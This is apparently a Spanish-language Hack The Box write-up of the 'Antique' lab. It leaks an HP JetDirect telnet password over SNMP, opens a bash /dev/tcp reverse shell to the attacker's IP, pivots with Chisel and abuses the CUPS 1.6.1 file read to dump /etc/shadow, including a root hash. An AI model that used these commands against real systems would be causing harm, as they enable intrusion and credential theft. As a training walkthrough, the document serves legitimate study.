---
layout: post
title: HTB Antique
date: '2023-12-23 09:33:57 -0500'
categories: [HTB, Easy]
tags: [UDP, TCP, Telnet , Linux, RCE , Web, Pivoting  , Nmap , SNMP , CUPS , CVE , infoDisclosure] 
image:
  path: /antique/preview.png
  alt: Antique
---

## Resumen
![logo](/antique/logo.png){: .right w="200" h="200" }

## Reconocimiento

Para empezar, se realiza un **ping** a la máquina para saber si se cuenta con conectividad hacia ella.

```bash
ping 10.10.11.107 -c 1

PING 10.10.11.107 (10.10.11.107) 56(84) bytes of data.
64 bytes from 10.10.11.107: icmp_seq=1 ttl=63 time=298 ms

--- 10.10.11.107 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 297.783/297.783/297.783/0.000 ms
```
{: .nolineno}


### Escaneo de Puertos

Ahora se puede realizar un escaneo con **Nmap** para ver qué puertos están abiertos.
```bash
nmap -p- --min-rate 2000 10.10.11.107 -Pn -oG ports

Nmap scan report for 10.10.11.107
Host is up (0.16s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
23/tcp open  telnet
```
{: .nolineno}


Luego se puede realizar un **escaneo** mucho más profundo para ver qué versión de **Telnet** está utilizando; Pero lamentablemente, no se sabe cuál es la versión.
```bash
nmap -p23 -sVC 10.10.11.107 -Pn -oN versions
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-23 09:53 EST
Nmap scan report for 10.10.11.107
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
23/tcp open  telnet?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
|     JetDirect
|     Password:
|   NULL: 
|_    JetDirect
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port23-TCP:V=7.94SVN%I=7%D=12/23%Time=6586F455%P=x86_64-pc-linux-gnu%r(
SF:NULL,F,"\nHP\x20JetDirect\n\n")%r(GenericLines,19,"\nHP\x20JetDirect\n\
SF:nPassword:\x20")%r(tn3270,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Ge
SF:tRequest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(HTTPOptions,19,"\nH
SF:P\x20JetDirect\n\nPassword:\x20")%r(RTSPRequest,19,"\nHP\x20JetDirect\n
SF:\nPassword:\x20")%r(RPCCheck,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r
SF:(DNSVersionBindReqTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNSSta
SF:tusRequestTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Help,19,"\nHP\
SF:x20JetDirect\n\nPassword:\x20")%r(SSLSessionReq,19,"\nHP\x20JetDirect\n
SF:\nPassword:\x20")%r(TerminalServerCookie,19,"\nHP\x20JetDirect\n\nPassw
SF:ord:\x20")%r(TLSSessionReq,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(K
SF:erberos,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(SMBProgNeg,19,"\nHP\
SF:x20JetDirect\n\nPassword:\x20")%r(X11Probe,19,"\nHP\x20JetDirect\n\nPas
SF:sword:\x20")%r(FourOhFourRequest,19,"\nHP\x20JetDirect\n\nPassword:\x20
SF:")%r(LPDString,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPSearchReq
SF:,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPBindReq,19,"\nHP\x20Jet
SF:Direct\n\nPassword:\x20")%r(SIPOptions,19,"\nHP\x20JetDirect\n\nPasswor
SF:d:\x20")%r(LANDesk-RC,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Termin
SF:alServer,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(NCP,19,"\nHP\x20Jet
SF:Direct\n\nPassword:\x20")%r(NotesRPC,19,"\nHP\x20JetDirect\n\nPassword:
SF:\x20")%r(JavaRMI,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(WMSRequest,
SF:19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(oracle-tns,19,"\nHP\x20JetDi
SF:rect\n\nPassword:\x20")%r(ms-sql-s,19,"\nHP\x20JetDirect\n\nPassword:\x
SF:20")%r(afp,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(giop,19,"\nHP\x20
SF:JetDirect\n\nPassword:\x20");
```
{: .nolineno}


> **Telnet** es el nombre de un protocolo de **red** que nos permite acceder a otra máquina para manejarla remotamente como si estuviéramos sentados delante de ella. 
{: .prompt-info}


En este punto, debido a que hay muy pocos puertos para realizar **análisis**, el consejo que me dio un amigo una vez fue que se puede realizar el escaneo por **UDP** para ver si hay algún otro servicio corriendo. Por lo tanto, se puede hacer uso del siguiente comando:

```bash
sudo nmap -p- -sU --min-rate 2000 10.10.11.107 -Pn -oG portsUDP

Nmap scan report for 10.10.11.107
Host is up (0.17s latency).
Not shown: 65186 open|filtered udp ports (no-response), 348 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp
```
{: .nolineno}


Al ver que existe un puerto, se puede realizar un escaneo mucho más profundo sobre este mismo.
```bash
sudo nmap -p161 -sU -sVC 10.10.11.107 -Pn -oN versionsUDP

Nmap scan report for 10.10.11.107
Host is up (0.24s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server (public)
```
{: .nolineno}


> **SNMP** es un protocolo de la capa de aplicación que facilita el intercambio de **información** de **administración** entre dispositivos de **red**.
{: .prompt-info}


## Enumeración


Al intentar conectarse por medio de **Telnet** con el siguiente comando, se puede ver algo muy interesante, que es el nombre del **equipo**; y al investigar sobre el se descubre que resulta ser una **impresora**.

```bash
telnet 10.10.11.107 23
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect


Password: admin
Invalid password
Connection closed by foreign host.
```
{: .nolineno}

Al investigar qué es una **JetDirect**, se descubre que es básicamente una impresora que puede conectarse a **Internet**.
![quees](/antique/quees.png)

Y al buscar sobre la posible **contraseña** por defecto, se encuentra que esta es asignada por el servidor, por lo que no se puede encontrar de momento.

![default](/antique/default.png)


Al investigar en internet, se puede ver que existe el [**CVE-2002-1048**](https://nvd.nist.gov/vuln/detail/CVE-2002-1048), que consiste en una **divulgación de información** con el que se pueden ver las credenciales de la impresora para el servicio **Telnet**. El problema de este ataque es que es necesario contar con dos cosas: que se encuentre habilitado el servicio **SNMP** (cosa que ya se descubrió) y se necesita saber el **community name**, que por defecto es **public**, pero para las impresoras **JetDirect** también puede ser **internal**. Con esto se puede probar qué sucede; una gran explicación de todo esto se encuentra en el siguiente blog http://www.irongeek.com/i.php?page=security/networkprinterhacking.(Debo dejar la url hardcodeada ya qué como no usa https no me permite subirlo como link) 

Por lo que se puede realizar la validación gracias **nmpwalk**  con el siguiente comando:


```bash
nmpwalk -v 2c -c public 10.10.11.107
iso.3.6.1.2.1 = STRING: "HTB Printer"
```
{: .nolineno}


## Explotación

Ahora que se tiene el nombre del **equipo**, se puede intentar revisar más información dentro del mismo, donde se puede ver su **contraseña** revisando a mayor nivel la profundidad del árbol.

```bash
snmpwalk -v 2c -c publica 10.10.11.107 1
iso.3.6.1.2.1 = STRING: "HTB Printer"
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 
iso.3.6.1.4.1.11.2.3.9.1.2.1.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```
{: .nolineno}

Y en teoría, dentro del valor que se encuentra después de la cadena BITS:, debería contener la contraseña de Telnet en valor **hexadecimal**.Por lo que se usa un [decodificador en línea](https://www.rapidtables.com/convert/number/hex-to-ascii.html) y se ve que se obtiene una posible contraseña.

![decoder](/antique/decode.png)


```bash
P@ssw0rd@123!!123q"2Rbs3CSs$4EuWGW(8i	IYaA"1&1A5
```
{: .nolineno}

Y después de probar un rato con varias posibilidades, se descubre que la contraseña es **P@ssw0rd@123!!123**.

```bash
telnet 10.10.11.107 23

Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect


Password: P@ssw0rd@123!!123

Please type "?" for HELP
> 
```
{: .nolineno}

Ahora se pueden revisar qué comandos están habilitados dentro del equipo con el comando **?**


```bash
To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session
```
{: .nolineno}


Dentro de los comandos que se pueden utilizar, se puede ver algo llamativo, que es el comando **exec** que permite ejecutar comandos directamente en el sistema.


```bash
> exec whoami
lp
```
{: .nolineno}

Por lo que se puede enviar una **shell reversa** hacia la computadora para obtener conexión sobre el equipo. Por lo que dentro del equipo atacante hay que ponerse a la escucha con **NC** y dentro de la impresora enviar la shell.

```bash
nc -lvp 4444
```
{: .nolineno}


```bash
bash -c 'exec bash -i &>/dev/tcp/10.10.14.17/4444 <&1'
```
{: .nolineno}


```bash
nc -lvp  4444
listening on [any] 4444 ...
10.10.11.107: inverse host lookup failed: Unknown host
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.107] 39162
bash: cannot set terminal process group (1013): Inappropriate ioctl for device
bash: no job control in this shell
lp@antique:~$ 
```
{: .nolineno}


## Escalada de Privilegios

Al revisar los puertos que se encuentran en ejecución dentro del equipo con ayuda de **netstat**, se puede ver lo siguiente:


```bash
netstat -tunlp

Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      1021/python3        
tcp6       0      0 ::1:631                 :::*                    LISTEN      -                   
udp        0      0 0.0.0.0:161             0.0.0.0:*                           -                 
```
{: .nolineno}


Ahora, con esto se puede ver que hay un servicio corriendo dentro del equipo en el puerto **631**, pero al investigar, no parece tener un servicio habitual, por lo que se puede intentar hacerle un **curl** para obtener información.

Y se puede ver que se está usando algo llamado CUPS en su versión 1.6.1.
```bash
curl  http://127.0.0.1:631
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML>
<HEAD>
	<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
	<TITLE>Home - CUPS 1.6.1</TITLE>
	<LINK REL="STYLESHEET" TYPE="text/css" HREF="/cups.css">
	<LINK REL="SHORTCUT ICON" HREF="/images/cups-icon.png" TYPE="image/png">
</HEAD>
<BODY>
```
{: .nolineno}
### Pivoting

Ahora se puede realizar la **explotación**, pero quiero hacer un poco de pivoting para practicar un poco. Para esto, vamos a necesitar la ayuda de [**Chisel**](https://github.com/jpillora/chisel) para poder ver la web dentro de nuestro equipo. Solo es necesario descargar la versión compatible tanto con el equipo atacante como con el equipo víctima y transferir el archivo.


```bash
python3 -m http.server 8081
```
{: .nolineno}

Y dentro de la máquina atacante:

```bash
wget http://10.10.17.14:8081/chisel
```

Ahora es necesario ejecutarlo como servidor dentro del atacante y como cliente dentro de la víctima con los siguientes comandos:

#### Atacante
```bash
./chisel server --reverse -p puerto
```
{: .nolineno}

```bash
./chisel server --reverse -p 1234
```
{: .nolineno}



#### Vícitima

```bash
./chisel client IpAtacante:PuertoAtacante R:puerto:IpExponer:puertoExponer
```
{: .nolineno}


```bash
./chisel client 10.10.14.17:1234 R:631:127.0.0.1:631
```
{: .nolineno}


Y después de esto, deberíamos poder ver en nuestro puerto 631 la página web.


![cups](/antique/cups.png)


### Explotación 

Ahora, al investigar sobre vulnerabilidades específicas, se encuentra una **divulgación de información** que me permite leer archivos dentro del servidor para posteriores ataques. En el siguiente [repositorio](https://github.com/p1ckzi/CVE-2012-5519), explican cómo se puede explotar la vulnerabilidad y existe un exploit que automatiza el ataque. Sin embargo, dentro de la explicación dicen que solo es necesario ejecutar el siguiente comando, cambiando la ruta del archivo, para leer el contenido:

```bash
cupsctl ErrorLog=/etc/shadow WebInterface=Yes && curl 'http://localhost:631/admin/log/error_log'

root:$6$UgdyXjp3KC.86MSD$sMLE6Yo9Wwt636DSE2Jhd9M5hvWoy6btMs.oYtGQp7x4iDRlGCGJg8Ge9NO84P5lzjHN1WViD3jqX/VMw4LiR.:18760:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
sync:*:18375:0:99999:7:::
games:*:18375:0:99999:7:::
man:*:18375:0:99999:7:::
lp:*:18375:0:99999:7:::
mail:*:18375:0:99999:7:::
news:*:18375:0:99999:7:::
uucp:*:18375:0:99999:7:::
proxy:*:18375:0:99999:7:::
www-data:*:18375:0:99999:7:::
backup:*:18375:0:99999:7:::
list:*:18375:0:99999:7:::
irc:*:18375:0:99999:7:::
gnats:*:18375:0:99999:7:::
nobody:*:18375:0:99999:7:::
systemd-network:*:18375:0:99999:7:::
systemd-resolve:*:18375:0:99999:7:::
systemd-timesync:*:18375:0:99999:7:::
messagebus:*:18375:0:99999:7:::
syslog:*:18375:0:99999:7:::
_apt:*:18375:0:99999:7:::
tss:*:18375:0:99999:7:::
uuidd:*:18375:0:99999:7:::
tcpdump:*:18375:0:99999:7:::
landscape:*:18375:0:99999:7:::
pollinate:*:18375:0:99999:7:::
systemd-coredump:!!:18389::::::
lxd:!:18389::::::
usbmux:*:18891:0:99999:7:::
```
{: .nolineno}

Por lo que se puede revisar la flag de usuario administrador

```bash
lp@antique:/tmp$ cupsctl ErrorLog=/root/root.txt WebInterface=Yes && curl 'http://localhost:631/admin/log/error_log'
6f8eae989c34f0e1613427802d4bd087
lp@antique:/tmp$ 
```
{: .nolineno}
